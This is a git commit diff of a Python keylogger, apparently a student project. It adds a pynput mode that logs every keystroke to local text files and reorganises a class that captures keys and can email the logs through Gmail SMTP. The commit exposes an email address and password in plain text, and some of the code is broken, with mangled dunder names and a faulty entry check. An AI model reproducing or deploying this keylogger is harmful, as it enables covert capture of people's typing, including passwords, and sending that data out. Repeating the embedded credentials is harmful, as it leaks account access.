ac8ec7caf5e8fe5f34961dbf23fb137108818ff3
Divya Teja <pendyaladivyateja@gmail.com>
2022-01-29 14:37:16 +0530

    modified code

--- keylogger.py
+++ keylogger.py
@@ -1,100 +1,136 @@
+from pynput.keyboard import Key, Listener
+import logging
 import keyboard
 import smtplib
 from threading import Timer
 from datetime import datetime
 
-SEND_REPORT_EVERY = 60
-EMAIL_ADDRESS = "20071A05P7@vnrvjiet.in"
-EMAIL_PASSWORD = "vnrvjiet"
+print('Options 1.Text file 2.Email')
+opt = int(input('Select option  : '))
 
-class Keylogger:
-    def _init_(self, interval, report_method="email"):
+if opt == 1:
 
-        self.interval = interval
-        self.report_method = report_method
+    count = 0
+    keys = []
 
-        self.log = ""
+    logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
 
-        self.start_dt = datetime.now()
-        self.end_dt = datetime.now()
+    def write_to_file(keys):
+        with open("text.txt","a") as f:
+            for key in keys:
+                f.write(str(key))
 
+    def on_press(key):
+        logging.info(str(key))
+        global keys,count
+        keys.append(key)
+        count += 1
 
-    def callback(self, event):
+        if count >= 10:
+            count = 0
+            write_to_file(keys)
+            keys = []
 
-        name = event.name
-        if len(name) > 1:
+    def on_release(key):
+        if key == Key.esc:
+            return False
 
-            if name == "space":
+    with Listener(on_press=on_press, on_release=on_release) as listener :
+        listener.join()
 
-                name = " "
-            elif name == "enter":
+else:
+    SEND_REPORT_EVERY = 60
+    EMAIL_ADDRESS = "20071A05P7@vnrvjiet.in"
+    EMAIL_PASSWORD = "vnrvjiet"
 
-                name = "[ENTER]\n"
-            elif name == "decimal":
-                name = "."
-            else:
+    class Keylogger:
+        def init(self, interval, report_method="email"):
 
-                name = name.replace(" ", "_")
-                name = f"[{name.upper()}]"
-
-        self.log += name
-
-
-    def update_filename(self):
-
-        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
-        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
-        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
-
-    def report_to_file(self):
-        with open(f"{self.filename}.txt", "w") as f:
-
-            print(self.log, file=f)
-        print(f"[+] Saved {self.filename}.txt")
-
-    def sendmail(self, email, password, message):
-
-        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
-
-        server.starttls()
-
-        server.login(email, password)
-
-        server.sendmail(email, email, message)
-
-        server.quit()
-
-    def report(self):
-
-        if self.log:
-
-                self.end_dt = datetime.now()
-
-                self.update_filename()
-                if self.report_method == "email":
-                    self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
-                elif self.report_method == "file":
-                    self.report_to_file()
-
-                self.start_dt = datetime.now()
-                self.log = ""
-                timer = Timer(interval=self.interval, function=self.report)
-
-                timer.daemon = True
-
-                timer.start()
-
-    def start(self):
+            self.interval = interval
+            self.report_method = report_method
+# hello
+            self.log = ""
 
             self.start_dt = datetime.now()
+            self.end_dt = datetime.now()
 
-            keyboard.on_release(callback=self.callback)
 
-            self.report()
+        def callback(self, event):
 
-            keyboard.wait()
+            name = event.name
+            if len(name) > 1:
 
-if _name_ == "_main_":
+                if name == "space":
 
-    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
-    keylogger.start()
+                    name = " "
+                elif name == "enter":
+
+                    name = "[ENTER]\n"
+                elif name == "decimal":
+                    name = "."
+                else:
+
+                    name = name.replace(" ", "_")
+                    name = f"[{name.upper()}]"
+
+            self.log += name
+
+
+        def update_filename(self):
+
+            start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
+            end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
+            self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
+
+        def report_to_file(self):
+            with open(f"{self.filename}.txt", "w") as f:
+
+                print(self.log, file=f)
+            print(f"[+] Saved {self.filename}.txt")
+
+        def sendmail(self, email, password, message):
+
+            server = smtplib.SMTP(host="smtp.gmail.com", port=587)
+
+            server.starttls()
+
+            server.login(email, password)
+
+            server.sendmail(email, email, message)
+
+            server.quit()
+
+        def report(self):
+
+            if self.log:
+
+                    self.end_dt = datetime.now()
+
+                    self.update_filename()
+                    if self.report_method == "email":
+                        self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
+                    elif self.report_method == "file":
+                        self.report_to_file()
+
+                    self.start_dt = datetime.now()
+                    self.log = ""
+                    timer = Timer(interval=self.interval, function=self.report)
+
+                    timer.daemon = True
+
+                    timer.start()
+
+        def start(self):
+
+                self.start_dt = datetime.now()
+
+                keyboard.on_release(callback=self.callback)
+
+                self.report()
+
+                keyboard.wait()
+
+    if name == "main":
+
+        keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
+        keylogger.start()
